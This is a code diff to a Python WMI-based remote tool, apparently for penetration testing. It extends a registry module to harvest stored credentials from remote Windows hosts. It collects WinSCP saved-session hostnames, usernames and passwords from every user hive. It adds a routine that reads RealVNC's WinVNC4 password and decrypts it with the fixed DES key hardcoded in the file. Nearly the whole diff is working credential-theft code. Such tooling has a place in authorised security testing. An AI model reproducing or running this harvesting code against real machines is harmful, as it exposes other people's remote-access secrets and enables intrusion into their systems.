@@ -1,12 +1,16 @@
+from binascii import Error as BinasciiError, unhexlify
 from enum import Enum
 from typing import Optional
-
+from Cryptodome.Cipher import DES
 from wmipg.common import WMIConnector
 
 REG_MAP = {
     "HKU": 2147483651,
     "HKLM": 2147483650,
 }
+
+REALVNC_DES_KEY = bytes.fromhex("e84ad660c4721ae0")
+REALVNC_DES_IV = bytes(8)
 
 
 def parse_reg_key(key_name) -> tuple[int, str]:
@@ -53,6 +57,7 @@ class Registry:
         hku = REG_MAP["HKU"]
         users = srp.EnumKey(hku, "").sNames
 
+        res = {}
         winscp = r"Software\Martin Prikryl\WinSCP 2\Sessions"
         winscp_res = {}
         for user in users:
@@ -63,12 +68,62 @@ class Registry:
                 for session in sessions:
                     spath = rf"{path}\{session}"
                     winscp_res[user][session] = {
-                        "HostName": srp.GetStringValue(hku, spath, "HostName").sValue,
-                        "Password": srp.GetStringValue(hku, spath, "Password").sValue,
-                        "UserName": srp.GetStringValue(hku, spath, "UserName").sValue,
+                        "HostName": self._reg_get_string(
+                            srp, hku, spath, "HostName"
+                        ),
+                        "Password": self._reg_get_string(
+                            srp, hku, spath, "Password"
+                        ),
+                        "UserName": self._reg_get_string(
+                            srp, hku, spath, "UserName"
+                        ),
                     }
 
-        return winscp_res
+        res["WinSCP"] = winscp_res
+        res["RealVNC"] = self._enum_realvnc(srp)
+        return res
+
+    def _enum_realvnc(self, srp):
+        hklm = REG_MAP["HKLM"]
+        path = r"Software\RealVNC\WinVNC4"
+        realvnc_res = {
+            "PortNumber": self._reg_get_string(srp, hklm, path, "PortNumber"),
+            "HTTPPortNumber": self._reg_get_string(
+                srp, hklm, path, "HTTPPortNumber"
+            ),
+        }
+
+        encrypted_password = self._reg_get_string(srp, hklm, path, "Password")
+        if encrypted_password:
+            realvnc_res["PasswordEncrypted"] = encrypted_password
+            try:
+                realvnc_res["Password"] = self._decrypt_realvnc_password(
+                    encrypted_password
+                )
+            except ValueError as e:
+                realvnc_res["Password"] = None
+                realvnc_res["PasswordError"] = str(e)
+
+        return realvnc_res
+
+    @staticmethod
+    def _decrypt_realvnc_password(password: str):
+        try:
+            encrypted_password = unhexlify(password.strip())
+        except (BinasciiError, ValueError) as e:
+            raise ValueError("invalid encrypted RealVNC password hex") from e
+
+        cipher = DES.new(REALVNC_DES_KEY, DES.MODE_CBC, iv=REALVNC_DES_IV)
+        decrypted_password = cipher.decrypt(encrypted_password).rstrip(b"\x00")
+
+        try:
+            return decrypted_password.decode()
+        except UnicodeDecodeError:
+            return decrypted_password.hex()
+
+    @staticmethod
+    def _reg_get_string(srp, hive, path, value):
+        return srp.GetStringValue(hive, path, value).sValue
 
     def _reg_query_value(
         self, srp, key_name: str, value: Optional[str], type: RegValueTypeEnum
@@ -107,7 +162,9 @@ class Registry:
 
         return "\n".join(output)
 
-    def query(self, key_name: str, value: Optional[str], type: RegValueTypeEnum):
+    def query(
+        self, key_name: str, value: Optional[str], type: RegValueTypeEnum
+    ):
         srp, _ = self.wmi.iWbemServices.GetObject("StdRegProv")
 
         if value:
@@ -116,7 +173,11 @@ class Registry:
             return self._reg_enum_path(srp, key_name)
 
     def set_value(
-        self, key_name: str, value: str, data: str | bytes, type: RegValueTypeEnum
+        self,
+        key_name: str,
+        value: str,
+        data: str | bytes,
+        type: RegValueTypeEnum,
     ):
         srp, _ = self.wmi.iWbemServices.GetObject("StdRegProv")
         hive, path = parse_reg_key(key_name)
